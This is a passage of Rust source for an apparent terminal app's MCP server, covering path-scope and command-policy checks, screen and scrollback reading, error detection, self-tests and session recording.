    /// wheel events and stitch the frames by exact row-hash matching.
    fn capture_window_scroll(&self, params: &Value) -> Result<Value> {
        #[cfg(target_os = "macos")]
        {
            // Capturing another application's window is an OS API the host
            // owns; on other platforms the default says so.
            let host = unterm_engine::mcp_host()
                .ok_or_else(|| anyhow!("no front end is hosting this MCP surface"))?;
            host.capture_external_window(params)
        }
        #[cfg(not(target_os = "macos"))]
        {
            let _ = params;
            Err(anyhow!(
                "capture.window_scroll is currently macOS-only; \
                 use capture.window for a single-frame capture"
            ))
        }
    }

    // --- Policy ---

    fn path_scope_from_params(
        &self,
        params: &Value,
    ) -> Result<Option<unterm_services::path_scope::PathScope>> {
        match params.get("path_scope") {
            Some(value) => serde_json::from_value(value.clone())
                .map(Some)
                .map_err(|e| anyhow!("Invalid path_scope: {e}")),
            None => Ok(None),
        }
    }

    fn check_path_scope_param(
        &self,
        method: &str,
        params: &Value,
        pane_id: Option<usize>,
        access: unterm_services::path_scope::PathAccess,
        path: impl AsRef<std::path::Path>,
    ) -> Result<()> {
        let Some(scope) = self.path_scope_from_params(params)? else {
            return Ok(());
        };
        let decision = scope.check(access, path.as_ref());
        if decision.allowed {
            return Ok(());
        }
        self.audit(
            "mcp.gateway.denied",
            pane_id.as_ref().map(|id| id.to_string()).as_deref(),
            &format!(
                "method={} code={} reason={} resolved_path={}",
                method,
                decision.code,
                decision.reason,
                decision.resolved_path.as_deref().unwrap_or("<unresolved>")
            ),
        );
        Err(anyhow!("{}: {}", decision.code, decision.reason))
    }

    fn check_pane_cwd_path_scope(
        &self,
        method: &str,
        params: &Value,
        pane_id: usize,
        engine: &dyn unterm_engine::HostEngine,
    ) -> Result<()> {
        if params.get("path_scope").is_none() {
            return Ok(());
        }
        let Some(cwd) = engine.shell(pane_id)?.cwd else {
            self.audit(
                "mcp.gateway.denied",
                Some(&pane_id.to_string()),
                &format!("method={method} code=path_scope_missing_cwd"),
            );
            return Err(anyhow!(
                "path_scope_missing_cwd: pane cwd is unavailable for path scope enforcement"
            ));
        };
        self.check_path_scope_param(
            method,
            params,
            Some(pane_id),
            unterm_services::path_scope::PathAccess::Write,
            cwd,
        )
    }

    fn policy_set(&self, params: &Value) -> Result<Value> {
        let policy: CommandPolicy =
            serde_json::from_value(params.clone()).map_err(|e| anyhow!("Invalid policy: {}", e))?;
        self.audit("policy.set", None, &format!("enabled={}", policy.enabled));
        mcp_state().lock().policy = policy;
        Ok(json!({"set": true}))
    }

    fn policy_check(&self, params: &Value) -> Result<Value> {
        let command = params
            .get("command")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'command'"))?;

        let method = params
            .get("method")
            .and_then(|v| v.as_str())
            .unwrap_or("exec.run");
        let policy = {
            let state = mcp_state().lock();
            unterm_services::gateway::SettingsPolicy::new(
                state.policy.enabled,
                state.policy.blocked_patterns.clone(),
                state.policy.allowed_patterns.clone(),
            )
        };
        let verdict = unterm_gateway::decide(
            &unterm_gateway::ActionContext::new(method)
                .entry(unterm_gateway::Entry::Mcp)
                .command(command),
            &policy,
            &unterm_gateway::NoGrants,
        );
        // The shape is a contract: clients parse these field names. The
        // values now come from the one gateway rather than a copy, but
        // `lease` and `path_scope` stay as the placeholders they have always
        // been — M5 and M6 are what fill them in, and inventing an answer for
        // them here would be a promise nothing keeps.
        Ok(json!({
            "allowed": verdict.allowed,
            "code": verdict.code.as_str(),
            "reason": verdict.reason,
            "risk": verdict.risk.as_str(),
            "lease": "not_configured",
            "path_scope": "not_configured",
        }))
    }

    /// The MCP door's policy stage, asked of the one gateway.
    ///
    /// This used to be a copy of the decision living in this file. A copy is
    /// four opportunities to disagree with the other doors, and the one that
    /// disagrees quietly is the one that matters — so the copy is gone and
    /// this asks `unterm_services::gateway`, which is the same call the CLI,
    /// a Brain adapter and the PTY write path make. The codes and the error
    /// text are unchanged; they cross the wire and land in audit logs.
    fn check_policy_internal(&self, method: &str, command: &str) -> Result<()> {
        let policy = {
            let state = mcp_state().lock();
            unterm_services::gateway::SettingsPolicy::new(
                state.policy.enabled,
                state.policy.blocked_patterns.clone(),
                state.policy.allowed_patterns.clone(),
            )
        };
        let context = unterm_gateway::ActionContext::new(method)
            .entry(unterm_gateway::Entry::Mcp)
            .command(command);
        let passage = unterm_services::gateway::admit(&context, &policy);
        if passage.verdict.allowed {
            Ok(())
        } else {
            Err(anyhow!(
                "{}: {}",
                passage.verdict.code.as_str(),
                passage.verdict.reason
            ))
        }
    }

    // --- System ---

    fn system_info(&self) -> Result<Value> {
        let sessions = self.engine().list_sessions()?;
        let active_session = sessions
            .iter()
            .find(|session| session.is_active)
            .or_else(|| sessions.first())
            .map(serde_json::to_value)
            .transpose()?
            .unwrap_or(Value::Null);
        let instance = unterm_services::server_info::read_current();
        Ok(json!({
            "name": "Unterm",
            "version": if instance.version.is_empty() {
                unterm_protocol::PRODUCT_VERSION
            } else {
                instance.version.as_str()
            },
            "engine": self.engine_label(),
            "os": std::env::consts::OS,
            "platform": std::env::consts::OS,
            "arch": std::env::consts::ARCH,
            "locale": unterm_services::i18n::current_locale(),
            "active_sessions": sessions.len(),
            "active_session": active_session,
            "hostname": hostname::get()
                .map(|h| h.to_string_lossy().to_string())
                .unwrap_or_default(),
        }))
    }

    fn system_launch_admin(&self, params: &Value) -> Result<Value> {
        #[cfg(windows)]
        {
            let dry_run = params
                .get("dry_run")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            let shell = params
                .get("shell")
                .and_then(|v| v.as_str())
                .unwrap_or("pwsh");
            let args = elevated_unterm_command_args(shell)?;

            if !dry_run {
                std::process::Command::new(&args[0])
                    .args(&args[1..])
                    .spawn()
                    .context("launch elevated Unterm window via PowerShell RunAs")?;
            }

            Ok(json!({
                "status": if dry_run { "dry_run" } else { "launched" },
                "requires_uac": true,
                "command": args,
            }))
        }

        #[cfg(not(windows))]
        {
            let _ = params;
            Err(anyhow!("Administrator launch is only supported on Windows"))
        }
    }

    // --- Helpers ---

    fn screen_read(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let screen = engine.read_screen(pane_id)?;

        Ok(json!({
            "cells": screen.cells,
            "cursor": {
                "x": screen.cursor.x,
                "y": screen.cursor.y,
                "visible": screen.cursor.visible,
            },
            "cols": screen.cols,
            "rows": screen.rows,
            "scrollback_rows": screen.scrollback_rows,
        }))
    }

    fn screen_text(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let screen = engine.read_screen(pane_id)?;

        Ok(json!({
            "lines": screen.lines,
            "cursor": { "x": screen.cursor.x, "y": screen.cursor.y },
            "cols": screen.cols,
            "rows": screen.rows,
        }))
    }

    /// Full scrollback + viewport as a single string, optionally with ANSI
    /// styling preserved. For long terminal output you want to feed to an
    /// LLM, this is strictly better than a rendered "long screenshot": no
    /// OCR step, no font fidelity loss, no encoding back to text on the
    /// other side. Pairs with `capture.*` for the human-consumption path.
    ///
    /// Params:
    /// - `pane_id` / `session_id` (optional): standard pane resolution.
    /// - `escapes` (bool, default false): if true, returns text with
    ///   embedded ANSI color/style escapes. If false, plain text only.
    /// - `start_line` (int, optional): clamp the start. Default: scrollback_top.
    /// - `end_line` (int, optional): clamp the end (exclusive). Default: bottom of viewport.
    ///   Both are absolute StableRowIndex values (negatives are allowed; the
    ///   server clamps to the actual scrollback range).
    /// - `tail_lines` (int, optional): keep only the last N rows within the
    ///   selected range. Useful for LLM hand-offs that need recent output
    ///   without fetching the entire scrollback.
    fn screen_scrollback_text(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::ACTIVE_EXISTING,
        )?;
        let want_escapes = params
            .get("escapes")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);

        let start_line = params
            .get("start_line")
            .and_then(|v| v.as_i64())
            .map(|n| n as i64);
        let end_line = params
            .get("end_line")
            .and_then(|v| v.as_i64())
            .map(|n| n as i64);
        let tail_lines = params.get("tail_lines").and_then(|v| v.as_i64());
        let snapshot = engine.read_scrollback_text(
            pane_id,
            ScrollbackTextRequest {
                start_line,
                end_line,
                tail_lines,
                escapes: want_escapes,
            },
        )?;

        if snapshot.row_count == 0 {
            return Ok(json!({
                "text": "",
                "lines": Vec::<String>::new(),
                "first_row": snapshot.first_row,
                "row_count": 0,
                "cols": snapshot.cols,
                "escapes": snapshot.escapes,
                "scrollback_top": snapshot.scrollback_top,
                "physical_top": snapshot.physical_top,
                "viewport_rows": snapshot.viewport_rows,
            }));
        }

        if snapshot.escapes {
            Ok(json!({
                "text": snapshot.text,
                "first_row": snapshot.first_row,
                "row_count": snapshot.row_count,
                "cols": snapshot.cols,
                "escapes": true,
                "scrollback_top": snapshot.scrollback_top,
                "physical_top": snapshot.physical_top,
                "viewport_rows": snapshot.viewport_rows,
            }))
        } else {
            Ok(json!({
                "text": snapshot.text,
                "lines": snapshot.lines,
                "first_row": snapshot.first_row,
                "row_count": snapshot.row_count,
                "cols": snapshot.cols,
                "escapes": false,
                "scrollback_top": snapshot.scrollback_top,
                "physical_top": snapshot.physical_top,
                "viewport_rows": snapshot.viewport_rows,
            }))
        }
    }

    fn screen_cursor(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let cursor = engine.cursor(pane_id)?;

        Ok(json!({
            "x": cursor.x,
            "y": cursor.y,
            "visible": cursor.visible,
            "shape": cursor.shape,
        }))
    }

    fn screen_detect_errors(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let screen = engine.read_screen(pane_id)?;

        let error_patterns = [
            "error:",
            "Error:",
            "ERROR:",
            "error[",
            "fatal:",
            "Fatal:",
            "FATAL:",
            "panic:",
            "PANIC:",
            "not found",
            "command not found",
            "Permission denied",
            "permission denied",
            "No such file or directory",
            "failed",
            "FAILED",
            "traceback",
            "Traceback",
            "Exception",
            "exception:",
            "segfault",
            "Segmentation fault",
        ];

        let mut errors: Vec<Value> = Vec::new();

        for line in screen.cells {
            let text = line.text;
            let trimmed = text.trim();
            if trimmed.is_empty() {
                continue;
            }
            for pattern in &error_patterns {
                if trimmed.contains(pattern) {
                    errors.push(json!({
                        "row": line.row,
                        "text": trimmed,
                        "pattern": pattern,
                    }));
                    break;
                }
            }
        }

        Ok(json!({
            "has_errors": !errors.is_empty(),
            "errors": errors,
        }))
    }

    fn selftest_run(&self, params: &Value) -> Result<Value> {
        let mut checks: Vec<Value> = Vec::new();
        let engine = self.engine();

        let engine_health = engine.health();
        let engine_available = engine_health
            .as_ref()
            .map(|health| health.ready)
            .unwrap_or(false);
        checks.push(json!({
            "name": "engine.available",
            "ok": engine_available,
            "detail": match engine_health {
                Ok(value) => json!(value),
                Err(err) => json!({"error": err.to_string()}),
            },
        }));

        let health = self.server_health()?;
        checks.push(json!({
            "name": "server.health",
            "ok": health["status"] == "ok",
            "detail": health,
        }));

        let caps = self.server_capabilities()?;
        let has_screen = caps
            .get("screen")
            .and_then(|v| v.as_array())
            .is_some_and(|v| !v.is_empty());
        checks.push(json!({
            "name": "server.capabilities",
            "ok": has_screen,
            "detail": {
                "has_screen": has_screen,
            },
        }));

        if self.engine().name() == "next-core" {
            let advertised_metrics = caps
                .pointer("/_engine_capabilities/diagnostics/health_metrics")
                .and_then(|value| value.as_array())
                .cloned()
                .unwrap_or_default();
            let health_io = health.pointer("/engine_health/io");
            let required_metrics = [
                "input_writes",
                "input_bytes",
                "output_chunks",
                "output_bytes",
                "paste_count",
                "paste_text_bytes",
            ];
            let advertised_all = required_metrics.iter().all(|name| {
                advertised_metrics
                    .iter()
                    .any(|metric| metric.as_str() == Some(*name))
            });
            let health_has_all = health_io.is_some_and(|io| {
                required_metrics
                    .iter()
                    .all(|name| io.get(*name).and_then(|value| value.as_u64()).is_some())
            });
            checks.push(json!({
                "name": "next_core.health_io_diagnostics",
                "ok": advertised_all && health_has_all,
                "detail": {
                    "advertised_metrics": advertised_metrics,
                    "health_io": health_io.cloned().unwrap_or(Value::Null),
                    "required_metrics": required_metrics,
                },
            }));

            let advertised_pump_metrics = caps
                .pointer("/_engine_capabilities/diagnostics/runtime_pump_metrics")
                .and_then(|value| value.as_array())
                .cloned()
                .unwrap_or_default();
            let runtime_pump = health.pointer("/engine_health/runtime_pump");
            let required_pump_metrics = [
                "drain_calls",
                "dispatched_commands",
                "dispatched_lifecycle_commands",
                "dispatched_input_commands",
                "dispatched_render_commands",
                "dispatched_screen_commands",
                "dispatched_background_commands",
                "waited_for_response",
                "completed_without_wait",
                "total_dispatch_elapsed_micros",
                "max_dispatch_elapsed_micros",
                "total_drain_elapsed_micros",
                "max_drain_elapsed_micros",
            ];
            let advertised_pump_all = required_pump_metrics.iter().all(|name| {
                advertised_pump_metrics
                    .iter()
                    .any(|metric| metric.as_str() == Some(*name))
            });
            let runtime_pump_has_all = runtime_pump.is_some_and(|pump| {
                required_pump_metrics
                    .iter()
                    .all(|name| pump.get(*name).and_then(|value| value.as_u64()).is_some())
            });
            checks.push(json!({
                "name": "next_core.runtime_pump_diagnostics",
                "ok": advertised_pump_all && runtime_pump_has_all,
                "detail": {
                    "advertised_metrics": advertised_pump_metrics,
                    "runtime_pump": runtime_pump.cloned().unwrap_or(Value::Null),
                    "required_metrics": required_pump_metrics,
                },
            }));

            let launch_context = self.selftest_next_core_launch_context();
            checks.push(json!({
                "name": "next_core.launch_context_diagnostics",
                "ok": launch_context
                    .as_ref()
                    .ok()
                    .and_then(|value| value.get("ok"))
                    .and_then(|value| value.as_bool())
                    .unwrap_or(false),
                "detail": match launch_context {
                    Ok(value) => value,
                    Err(err) => json!({"error": err.to_string()}),
                },
            }));

            let viewport = self.selftest_next_core_scroll_viewport();
            checks.push(json!({
                "name": "next_core.screen_scroll_viewport",
                "ok": viewport
                    .as_ref()
                    .ok()
                    .and_then(|value| value.get("ok"))
                    .and_then(|value| value.as_bool())
                    .unwrap_or(false),
                "detail": match viewport {
                    Ok(value) => value,
                    Err(err) => json!({"error": err.to_string()}),
                },
            }));

            let styled_capture = self.selftest_next_core_styled_scrollback_capture(&caps);
            let styled_capture_detail = match styled_capture {
                Ok(value) => value,
                Err(err) => selftest_limited_without_window(err),
            };
            checks.push(json!({
                "name": "next_core.styled_scrollback_capture",
                "ok": styled_capture_detail
                    .get("ok")
                    .and_then(|value| value.as_bool())
                    .unwrap_or(false),
                "detail": styled_capture_detail,
            }));
        }

        let policy = self.policy_check(&json!({"command": "echo unterm-selftest"}));
        checks.push(json!({
            "name": "policy.check",
            "ok": policy.is_ok(),
            "detail": match policy {
                Ok(value) => value,
                Err(err) => json!({"error": err.to_string()}),
            },
        }));

        let admin = self.system_launch_admin(&json!({"dry_run": true, "shell": "pwsh"}));
        // `system.launch_admin` is Windows-only (UAC elevation). Off Windows it
        // returns Err by design, so treating that as a failed check made
        // selftest.run always report ok:false on macOS/Linux. Score the Err as
        // "skipped" (n/a) on non-Windows so the suite reflects real health.
        let admin_ok = admin.is_ok() || cfg!(not(windows));
        checks.push(json!({
            "name": "system.launch_admin",
            "ok": admin_ok,
            "detail": match admin {
                Ok(value) => value,
                Err(err) => json!({"skipped": true, "reason": err.to_string()}),
            },
        }));

        let proxy = self.proxy_status();
        checks.push(json!({
            "name": "proxy.status",
            "ok": proxy.is_ok(),
            "detail": match proxy {
                Ok(value) => value,
                Err(err) => json!({"error": err.to_string()}),
            },
        }));

        let capture = self.capture_window(&json!({}));
        let capture_detail = match capture {
            Ok(value) => value,
            Err(err) => selftest_limited_without_window(err),
        };
        let capture_ok = capture_detail
            .get("limited")
            .and_then(|value| value.as_bool())
            .unwrap_or(false)
            || (capture_detail
                .pointer("/image/path")
                .and_then(|value| value.as_str())
                .map(|path| std::path::Path::new(path).exists())
                .unwrap_or(false)
                && (!cfg!(windows)
                    || matches!(
                        capture_detail
                            .pointer("/image/mode")
                            .and_then(|value| value.as_str()),
                        Some("print_window" | "focused_screen")
                    )));
        checks.push(json!({
            "name": "capture.window",
            "ok": capture_ok,
            "detail": capture_detail,
        }));

        if let Some(session_id) = params.get("session_id").and_then(|v| v.as_str()) {
            let session_params = json!({ "session_id": session_id });

            let session = self.session_get(&session_params);
            checks.push(json!({
                "name": "session.status",
                "ok": session.is_ok(),
                "detail": match session {
                    Ok(value) => value,
                    Err(err) => json!({"error": err.to_string()}),
                },
            }));

            let screen = self.screen_text(&session_params);
            checks.push(json!({
                "name": "screen.text",
                "ok": screen.is_ok(),
                "detail": match screen {
                    Ok(value) => value,
                    Err(err) => json!({"error": err.to_string()}),
                },
            }));

            let detect = self.screen_detect_errors(&session_params);
            checks.push(json!({
                "name": "screen.detect_errors",
                "ok": detect.is_ok(),
                "detail": match detect {
                    Ok(value) => value,
                    Err(err) => json!({"error": err.to_string()}),
                },
            }));
        }

        // Non-mutating recording self-check against pane 0 (or the
        // first available pane). We never start a recording here.
        let probe_sessions = engine.list_sessions();
        let probe_id = probe_sessions
            .as_ref()
            .ok()
            .and_then(|sessions| sessions.first())
            .map(|session| session.id as u64);
        if let Some(probe_id) = probe_id {
            let rec_status = self.session_recording_status(&json!({"id": probe_id}));
            checks.push(json!({
                "name": "session.recording_status",
                "ok": rec_status.is_ok(),
                "detail": match rec_status {
                    Ok(value) => json!({
                        "status": value,
                        "probe_session_id": probe_id,
                        "probe_source": "engine.list_sessions",
                    }),
                    Err(err) => json!({"error": err.to_string()}),
                },
            }));
        } else {
            checks.push(json!({
                "name": "session.recording_status",
                "ok": true,
                "detail": {
                    "skipped": true,
                    "reason": "no live session available for non-mutating recording probe",
                },
            }));
        }

        let ok = checks
            .iter()
            .all(|check| check.get("ok").and_then(|v| v.as_bool()).unwrap_or(false));

        Ok(json!({
            "ok": ok,
            "checks": checks,
        }))
    }

    fn selftest_next_core_launch_context(&self) -> Result<Value> {
        let env = vec![
            ("UNTERM_PROFILE".to_string(), "selftest-profile".to_string()),
            (
                "HTTPS_PROXY".to_string(),
                "http://127.0.0.1:7890".to_string(),
            ),
        ];
        let launch_policy = launch_policy_for_env(&env, &[], Some("selftest-profile"));
        let created = self.engine().create_session(CreateSessionRequest {
            cols: 80,
            rows: 3,
            command_dir: None,
            command: Some(shell_command_builder(if cfg!(windows) {
                "echo next-core-selftest-launch-context & ping -n 3 127.0.0.1 >NUL"
            } else {
                "echo next-core-selftest-launch-context; sleep 2"
            })),
            env,
            launch_policy,
        })?;
        let pane_id = created.id;

        let probe = (|| -> Result<Value> {
            let mut found_marker = false;
            for _ in 0..20 {
                let search = self.screen_search(&json!({
                    "pane_id": pane_id,
                    "pattern": "next-core-selftest-launch-context",
                }))?;
                if search["total"].as_u64().unwrap_or_default() > 0 {
                    found_marker = true;
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(50));
            }

            let env = self.session_env(&json!({ "pane_id": pane_id }))?;
            let variables = env["variables"].as_array().cloned().unwrap_or_default();
            let has_profile_key = variables
                .iter()
                .any(|var| var["name"].as_str() == Some("UNTERM_PROFILE"));
            let has_proxy_key = variables
                .iter()
                .any(|var| var["name"].as_str() == Some("HTTPS_PROXY"));
            let values_redacted = variables
                .iter()
                .all(|var| var["value"].is_null() && var["redacted"].as_bool().unwrap_or(false));
            let context = &env["launch_context"];
            let profile_ok = context["profile"].as_str() == Some("selftest-profile");
            let proxy_ok = context["proxy_env_keys"]
                .as_array()
                .is_some_and(|keys| keys.iter().any(|key| key.as_str() == Some("HTTPS_PROXY")));
            let env_key_count_ok = context["env_key_count"].as_u64().unwrap_or_default() >= 2;
            let policy = &context["policy"];
            let policy_profile_ok = policy["profile"].as_str() == Some("selftest-profile");
            let policy_sources = policy["env"].as_array().cloned().unwrap_or_default();
            let policy_profile_source_ok = policy_sources.iter().any(|binding| {
                binding["key"].as_str() == Some("UNTERM_PROFILE")
                    && binding["source"].as_str() == Some("Profile")
            });
            let policy_proxy_source_ok = policy_sources.iter().any(|binding| {
                binding["key"].as_str() == Some("HTTPS_PROXY")
                    && binding["source"].as_str() == Some("Proxy")
            });
            let policy_domain_decision_ok =
                policy["domain"]["decision"].as_str() == Some("not_requested");
            let policy_privilege_decision_ok =
                policy["privilege"]["decision"].as_str() == Some("not_requested");
            let policy_proxy_rotation_decision_ok =
                policy["proxy_rotation"]["decision"].as_str() == Some("deferred");
            let policy_restart_decision_ok =
                policy["restart"]["decision"].as_str() == Some("not_requested");

            Ok(json!({
                "ok": has_profile_key
                    && has_proxy_key
                    && values_redacted
                    && profile_ok
                    && proxy_ok
                    && env_key_count_ok
                    && policy_profile_ok
                    && policy_profile_source_ok
                    && policy_proxy_source_ok
                    && policy_domain_decision_ok
                    && policy_privilege_decision_ok
                    && policy_proxy_rotation_decision_ok
                    && policy_restart_decision_ok,
                "pane_id": pane_id,
                "found_marker": found_marker,
                "has_profile_key": has_profile_key,
                "has_proxy_key": has_proxy_key,
                "values_redacted": values_redacted,
                "profile": context["profile"].clone(),
                "proxy_key": if proxy_ok { "HTTPS_PROXY" } else { "" },
                "env_key_count": context["env_key_count"].clone(),
                "policy_profile": policy["profile"].clone(),
                "policy_profile_source_ok": policy_profile_source_ok,
                "policy_proxy_source_ok": policy_proxy_source_ok,
                "policy_domain_decision": policy["domain"]["decision"].clone(),
                "policy_privilege_decision": policy["privilege"]["decision"].clone(),
                "policy_proxy_rotation_decision": policy["proxy_rotation"]["decision"].clone(),
                "policy_restart_decision": policy["restart"]["decision"].clone(),
            }))
        })();

        let destroyed = self.session_destroy(&json!({ "pane_id": pane_id }));
        let mut detail = match probe {
            Ok(value) => value,
            Err(err) => json!({
                "ok": false,
                "pane_id": pane_id,
                "error": err.to_string(),
            }),
        };
        detail["destroyed"] = json!(destroyed.is_ok());
        if let Err(err) = destroyed {
            detail["destroy_error"] = json!(err.to_string());
            detail["ok"] = json!(false);
        }
        Ok(detail)
    }

    fn selftest_next_core_scroll_viewport(&self) -> Result<Value> {
        let command = if cfg!(windows) {
            "(for /L %i in (1,1,8) do @echo next-core-selftest-scroll-%i) & ping -n 3 127.0.0.1 >NUL"
        } else {
            "for i in 1 2 3 4 5 6 7 8; do echo next-core-selftest-scroll-$i; done; sleep 2"
        };
        let created = self.session_create(&json!({
            "cols": 80,
            "rows": 3,
            "command": command,
        }))?;
        let pane_id = created["id"]
            .as_u64()
            .ok_or_else(|| anyhow!("next-core selftest session.create did not return id"))?
            as usize;

        let probe = (|| -> Result<Value> {
            let mut found_tail = false;
            let mut search = Value::Null;
            for _ in 0..20 {
                search = self.screen_search(&json!({
                    "pane_id": pane_id,
                    "pattern": "next-core-selftest-scroll-8",
                }))?;
                if search["total"].as_u64().unwrap_or_default() > 0 {
                    found_tail = true;
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(50));
            }

            let mut scroll = Value::Null;
            let mut text = Value::Null;
            let mut target_visible = false;
            if found_tail {
                scroll = self.screen_scroll(&json!({
                    "pane_id": pane_id,
                    "offset": 1,
                    "count": 3,
                    "goto": true,
                }))?;
                text = self.screen_text(&json!({ "pane_id": pane_id }))?;
                target_visible = text["lines"].as_array().is_some_and(|lines| {
                    lines
                        .iter()
                        .any(|line| line.as_str() == Some("next-core-selftest-scroll-2"))
                });
            }

            let scrolled = scroll["scrolled_to"]["row"].as_i64() == Some(1)
                && scroll["goto_skipped"].is_null();
            Ok(json!({
                "ok": found_tail && scrolled && target_visible,
                "pane_id": pane_id,
                "found_tail": found_tail,
                "scrolled": scrolled,
                "target_visible": target_visible,
                "search": search,
                "scroll": scroll,
                "text": text,
            }))
        })();

        let destroyed = self.session_destroy(&json!({ "pane_id": pane_id }));
        let mut detail = match probe {
            Ok(value) => value,
            Err(err) => json!({
                "ok": false,
                "pane_id": pane_id,
                "error": err.to_string(),
            }),
        };
        detail["destroyed"] = json!(destroyed.is_ok());
        if let Err(err) = destroyed {
            detail["destroy_error"] = json!(err.to_string());
            detail["ok"] = json!(false);
        }
        Ok(detail)
    }

    fn selftest_next_core_styled_scrollback_capture(&self, caps: &Value) -> Result<Value> {
        let advertised = caps
            .pointer("/_engine_capabilities/diagnostics/styled_scrollback_png")
            .and_then(|value| value.as_bool())
            .unwrap_or(false);
        if !advertised {
            // Nothing to check: no front end is hosting us, so there is no
            // renderer. Reporting a pass would be a lie and a failure would be
            // a false alarm -- say plainly that it does not apply.
            return Ok(json!({
                "ok": true,
                "advertised": false,
                "skipped": "no front end is hosting this MCP surface",
                "destroyed": true,
            }));
        }
        let command = if cfg!(windows) {
            "echo next-core-selftest-styled-capture & ping -n 3 127.0.0.1 >NUL"
        } else {
            "echo next-core-selftest-styled-capture; sleep 2"
        };
        let created = self.session_create(&json!({
            "cols": 80,
            "rows": 3,
            "command": command,
        }))?;
        let pane_id = created["id"].as_u64().ok_or_else(|| {
            anyhow!("next-core styled capture selftest session.create did not return id")
        })? as usize;

        let probe = (|| -> Result<Value> {
            let mut found_marker = false;
            for _ in 0..100 {
                let search = self.screen_search(&json!({
                    "pane_id": pane_id,
                    "pattern": "next-core-selftest-styled-capture",
                }))?;
                if search["total"].as_u64().unwrap_or_default() > 0 {
                    found_marker = true;
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(50));
            }

            let capture = self.capture_scrollback(&json!({
                "pane_id": pane_id,
                "max_rows": 10,
                "dpi": 48,
            }))?;
            let path = capture["path"].as_str().unwrap_or_default().to_string();
            let path_exists = !path.is_empty() && std::path::Path::new(&path).exists();
            let png_header_ok = if path_exists {
                std::fs::read(&path)
                    .map(|bytes| bytes.starts_with(b"\x89PNG\r\n\x1a\n"))
                    .unwrap_or(false)
            } else {
                false
            };
            if path_exists {
                let _ = std::fs::remove_file(&path);
            }
            let dimensions_ok = capture["width"].as_u64().unwrap_or_default() > 0
                && capture["height"].as_u64().unwrap_or_default() > 0;
            let type_ok = capture["type"].as_str() == Some("image/png");

            Ok(json!({
                "ok": advertised && type_ok && path_exists && png_header_ok && dimensions_ok,
                "pane_id": pane_id,
                "advertised": advertised,
                "found_marker": found_marker,
                "type_ok": type_ok,
                "path_exists": path_exists,
                "png_header_ok": png_header_ok,
                "dimensions_ok": dimensions_ok,
                "capture": capture,
            }))
        })();

        let destroyed = self.session_destroy(&json!({ "pane_id": pane_id }));
        let mut detail = match probe {
            Ok(value) => value,
            Err(err) => {
                let mut value = selftest_limited_without_window(err);
                value["pane_id"] = json!(pane_id);
                value["advertised"] = json!(advertised);
                value
            }
        };
        detail["destroyed"] = json!(destroyed.is_ok());
        if let Err(err) = destroyed {
            detail["destroy_error"] = json!(err.to_string());
            detail["ok"] = json!(false);
        }
        Ok(detail)
    }

    // ----------------------------------------------------------------
    // Session recording
    // ----------------------------------------------------------------

    fn session_recording_start(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        self.audit(
            "session.recording_start",
            Some(&pane_id.to_string()),
            "start",
        );
        let r = engine.start_recording(pane_id)?;
        Ok(json!({
            "session_id": r.session_id,
            "log_path": r.log_path,
            "md_path_when_done": r.md_path,
        }))
    }

    fn session_recording_stop(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        self.audit("session.recording_stop", Some(&pane_id.to_string()), "stop");
        let r = engine.stop_recording(pane_id)?;
        Ok(json!({
            "session_id": r.session_id,
            "ended_at": r.ended_at,
            "block_count": r.block_count,
            "exit_reason": r.exit_reason,
            "md_path": r.md_path,
        }))
    }

    fn session_recording_status(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let status = engine.recording_status(pane_id)?;
        if status.enabled {
            Ok(json!({
                "enabled": true,
                "session_id": status.session_id,
                "started_at": status.started_at,
                "block_count": status.block_count,
                "bytes": status.bytes,
            }))
        } else {
            Ok(json!({"enabled": false}))
        }
    }

    fn session_recording_list(&self, params: &Value) -> Result<Value> {
        let project = params.get("project").and_then(|v| v.as_str());
        let entries = unterm_services::recording::archive::list_sessions(project)?;
        let entries_json: Vec<Value> = entries
            .into_iter()
            .map(|e| {
                json!({
                    "unterm_session_id": e.unterm_session_id,
                    "tab_id": e.tab_id,
                    "project_path": e.project_path,
                    "project_slug": e.project_slug,
                    "started_at": e.started_at,
                    "ended_at": e.ended_at,
                    "block_count": e.block_count,
                    "bytes_raw": e.bytes_raw,
                    "log_path": e.log_path,
                    "md_path": e.md_path,
                })
            })
            .collect();
        Ok(json!(entries_json))
    }

    fn session_recording_read(&self, params: &Value) -> Result<Value> {
        let session_id = params
            .get("session_id")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'session_id'"))?;
        let md = unterm_services::recording::archive::read_session_markdown(session_id)?;
        Ok(json!({"markdown": md}))
    }

    fn session_recording_attach_trace(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let trace_id = params
            .get("trace_id")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'trace_id'"))?
            .to_string();
